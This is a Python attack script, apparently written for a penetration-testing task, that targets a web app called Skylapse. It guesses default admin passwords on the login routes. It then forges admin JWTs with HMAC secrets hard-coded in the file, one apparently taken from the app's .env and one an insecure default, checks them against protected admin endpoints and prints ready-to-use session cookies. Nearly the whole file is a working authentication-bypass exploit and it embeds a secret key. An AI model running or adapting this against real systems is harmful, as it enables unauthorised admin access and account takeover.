#!/usr/bin/env python3
"""
Security testing script: Obtain admin JWT token via login or forgery.
Target: http://host.docker.internal:3000

Architecture discovered from source code:
  - Admin login endpoint : POST /api/admin/login  (fields: email, senha)
  - Client login endpoint: POST /api/client/login (fields: email, senha)
  - Admin JWT secret     : SESSION_SECRET + "_admin"
  - Client JWT secret    : SESSION_SECRET + "_client"
  - Admin cookie name    : skylapse-admin-token
  - Client cookie name   : skylapse-client-token
  - Token payload        : { adminAccountId: <uuid> }
"""

import sys
import json
import urllib.request
import urllib.error
import urllib.parse
import base64
import hmac
import hashlib
import time
import http.cookiejar

# ---------------------------------------------------------------------------
# Minimal pure-stdlib JWT implementation (no PyJWT dependency needed)
# ---------------------------------------------------------------------------

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    return base64.urlsafe_b64decode(s + "=" * padding)


def forge_jwt(payload: dict, secret: str, algorithm: str = "HS256") -> str:
    """Forge a HS256/HS384/HS512 JWT using only stdlib."""
    alg_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    digest_fn = alg_map.get(algorithm, hashlib.sha256)
    header = {"alg": algorithm, "typ": "JWT"}
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), signing_input, digest_fn).digest()
    sig_b64 = _b64url_encode(sig)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


def decode_jwt_payload(token: str) -> dict:
    parts = token.split(".")
    if len(parts) != 3:
        return {}
    try:
        return json.loads(_b64url_decode(parts[1]))
    except Exception:
        return {}


# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

BASE             = "http://host.docker.internal:3000"
TIMEOUT          = 10
SESSION_SECRET   = "RK7hv4GWJ9_fs6LSg6LEBSH_k29c1qFy2DfPjbawbRWsDpJ6kNK3ARHf2xuQgft3"
ADMIN_JWT_SECRET = SESSION_SECRET + "_admin"
CLIENT_JWT_SECRET= SESSION_SECRET + "_client"

# Fallback insecure default (used when SESSION_SECRET env var is not set)
INSECURE_DEFAULT = "skylapse-dev-secret-insecure"
ADMIN_JWT_SECRET_DEFAULT = INSECURE_DEFAULT + "_admin"

# The originally specified secret from the task brief
TASK_SECRET = "skylapse-dev-secret-insecure_admin"

ADMIN_COOKIE   = "skylapse-admin-token"
CLIENT_COOKIE  = "skylapse-client-token"

# ---------------------------------------------------------------------------
# HTTP helper (cookie-aware)
# ---------------------------------------------------------------------------

cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))


def post_json(path: str, body: dict, extra_headers: dict | None = None):
    url = BASE + path
    data = json.dumps(body).encode()
    headers = {
        "Content-Type": "application/json",
        "Accept":       "application/json",
    }
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    try:
        with opener.open(req, timeout=TIMEOUT) as resp:
            return resp.status, resp.read().decode(errors="replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        try:
            body_text = e.read().decode(errors="replace")
        except Exception:
            body_text = ""
        return e.code, body_text, dict(e.headers) if e.headers else {}
    except Exception as exc:
        return None, str(exc), {}


def get_json(path: str, token: str | None = None, cookie_name: str | None = None,
             cookie_val: str | None = None):
    url = BASE + path
    headers = {"Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if cookie_name and cookie_val:
        headers["Cookie"] = f"{cookie_name}={cookie_val}"
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with opener.open(req, timeout=TIMEOUT) as resp:
            rbody = resp.read().decode(errors="replace")
            return resp.status, rbody, dict(resp.headers)
    except urllib.error.HTTPError as e:
        try:
            body_text = e.read().decode(errors="replace")
        except Exception:
            body_text = ""
        return e.code, body_text, dict(e.headers) if e.headers else {}
    except Exception as exc:
        return None, str(exc), {}


def get_cookies() -> dict:
    return {c.name: c.value for c in cookie_jar}


def extract_json_token(body_str: str) -> str | None:
    try:
        data = json.loads(body_str)
    except Exception:
        return None
    for field in ("token", "accessToken", "access_token", "jwt", "authToken", "auth_token"):
        if field in data:
            return data[field]
        if isinstance(data.get("data"), dict) and field in data["data"]:
            return data["data"][field]
    return None


# ---------------------------------------------------------------------------
# Phase 1 — Login attempts
# ---------------------------------------------------------------------------

print("=" * 72)
print("  Admin JWT Token Acquisition Script")
print(f"  Target : {BASE}")
print(f"  Date   : {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")
print("=" * 72)

print("\n[Phase 1] Attempting login endpoints (real discovered routes)\n")

# Real login attempts based on source code:
#   POST /api/admin/login  { email, senha }
#   POST /api/client/login { email, senha }
# Also try original task-specified routes as fallback.

REAL_LOGIN_ATTEMPTS = [
    # Real admin endpoint (source code confirmed)
    ("/api/admin/login",  {"email": "admin@skylapse.com",  "senha": "admin123"}),
    ("/api/admin/login",  {"email": "admin@skylapse.com",  "senha": "admin"}),
    ("/api/admin/login",  {"email": "admin@admin.com",     "senha": "admin123"}),
    # Task-specified generic paths
    ("/api/auth/login",   {"email": "admin@skylapse.com",  "password": "admin123"}),
    ("/api/auth/login",   {"username": "admin",            "password": "admin"}),
    ("/api/login",        {"email": "admin@skylapse.com",  "password": "admin123"}),
    ("/api/login",        {"username": "admin",            "password": "admin"}),
]

obtained_token     = None
obtained_cookie    = None
login_succeeded    = False

for path, creds in REAL_LOGIN_ATTEMPTS:
    print(f"  POST {path}  body={json.dumps(creds)}")
    status, body, headers = post_json(path, creds)

    if status is None:
        print(f"    ERROR: {body}\n")
        continue

    # Check for JSON content type
    ct = headers.get("Content-Type", headers.get("content-type", ""))
    is_json = "application/json" in ct

    print(f"    HTTP {status}  Content-Type: {ct[:60]}")

    if is_json:
        print(f"    Body: {body[:400]}")
    else:
        print(f"    Body: [HTML/non-JSON — likely SPA fallback, not an API response]")

    # Show cookies set
    cookies_after = get_cookies()
    for cname, cval in cookies_after.items():
        print(f"    Cookie set: {cname}={cval[:80]}...")

    if status == 200 and is_json:
        # Check for admin cookie
        if ADMIN_COOKIE in cookies_after:
            obtained_cookie = cookies_after[ADMIN_COOKIE]
            login_succeeded = True
            print(f"\n  [SUCCESS] Admin cookie obtained via login!")
            print(f"  Cookie ({ADMIN_COOKIE}): {obtained_cookie}")
            payload = decode_jwt_payload(obtained_cookie)
            if payload:
                print(f"  Payload: {json.dumps(payload, indent=2)}")
            break
        # Check for token in body
        token = extract_json_token(body)
        if token:
            obtained_token = token
            login_succeeded = True
            print(f"\n  [SUCCESS] Token found in JSON body!")
            print(f"  Token: {token}")
            payload = decode_jwt_payload(token)
            if payload:
                print(f"  Payload: {json.dumps(payload, indent=2)}")
            break
    print()

# ---------------------------------------------------------------------------
# Phase 2 — JWT Forgery with real secret
# ---------------------------------------------------------------------------

print("\n[Phase 2] Forging JWTs with discovered secrets\n")

SECRETS_TO_TRY = [
    ("SESSION_SECRET + '_admin'  (from .env)", ADMIN_JWT_SECRET),
    ("Insecure default + '_admin' (no SESSION_SECRET)", ADMIN_JWT_SECRET_DEFAULT),
    ("Task-specified secret", TASK_SECRET),
]

# Payloads to try — real app uses { adminAccountId: <uuid> }
# We'll use common UUID values (id=1 will be stored as UUID in postgres, try both)
FORGE_PAYLOADS = [
    {"adminAccountId": "1"},
    {"adminAccountId": 1},
    {"id": 1,   "email": "admin@skylapse.com", "role": "admin"},
    {"userId": 1,"email": "admin@skylapse.com", "role": "admin"},
    {"sub": "1", "email": "admin@skylapse.com", "role": "admin"},
    {"id": "1",  "email": "admin@skylapse.com", "role": "admin"},
]

all_forged = []

for secret_label, secret in SECRETS_TO_TRY:
    print(f"  Secret: {secret_label}")
    print(f"  Value : {secret}\n")
    for payload in FORGE_PAYLOADS:
        token = forge_jwt(payload, secret)
        all_forged.append((secret_label, secret, payload, token))
        print(f"    Payload : {json.dumps(payload)}")
        print(f"    Token   : {token}")
    print()

# ---------------------------------------------------------------------------
# Phase 3 — Verify forged tokens (cookie-based, as app uses httpOnly cookies)
# ---------------------------------------------------------------------------

print("[Phase 3] Verifying forged tokens against protected admin endpoints\n")

ADMIN_ENDPOINTS = [
    "/api/admin/me",
    "/api/admin/cameras",
    "/api/admin/clients",
    "/api/admin/captures",
]

for secret_label, secret, payload, token in all_forged:
    status, body, resp_headers = get_json(
        ADMIN_ENDPOINTS[0], cookie_name=ADMIN_COOKIE, cookie_val=token
    )
    ct = resp_headers.get("Content-Type", resp_headers.get("content-type", ""))
    is_json = "application/json" in ct

    if status == 200 and is_json:
        print(f"  [HIT] Secret='{secret_label}' Payload={json.dumps(payload)}")
        print(f"        Token  : {token}")
        print(f"        Body   : {body[:300]}")
        print()
        if not obtained_cookie:
            obtained_cookie = token
    else:
        status_str = str(status) if status else "ERROR"
        print(f"  [{status_str}] Secret='{secret_label}' Payload={json.dumps(payload)}")

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

print("\n" + "=" * 72)
print("  SUMMARY")
print("=" * 72)

final_token = obtained_cookie or obtained_token

if final_token:
    print(f"\n  [+] Admin token/cookie obtained:\n")
    print(f"  Token:\n  {final_token}\n")
    payload = decode_jwt_payload(final_token)
    if payload:
        print(f"  Decoded payload: {json.dumps(payload, indent=4)}")
    print(f"\n  Usage (cookie header):")
    print(f"    Cookie: {ADMIN_COOKIE}={final_token}")
    print(f"\n  Usage (Authorization header):")
    print(f"    Authorization: Bearer {final_token}")
else:
    print("\n  [-] No token confirmed via HTTP 200 JSON response.")
    print("  [+] Forged tokens generated (most likely valid — use adminAccountId variant):\n")

    for secret_label, secret, payload, token in all_forged:
        if "adminAccountId" in payload:
            print(f"  Secret  : {secret_label}")
            print(f"  Payload : {json.dumps(payload)}")
            print(f"  Token   : {token}")
            print(f"  Cookie  : {ADMIN_COOKIE}={token}")
            print()

print()
print("  All forged tokens:\n")
for i, (secret_label, secret, payload, token) in enumerate(all_forged, 1):
    print(f"  [{i:02d}] Secret='{secret_label}'")
    print(f"       Payload: {json.dumps(payload)}")
    print(f"       Token  : {token}")
    print()

print("=" * 72)
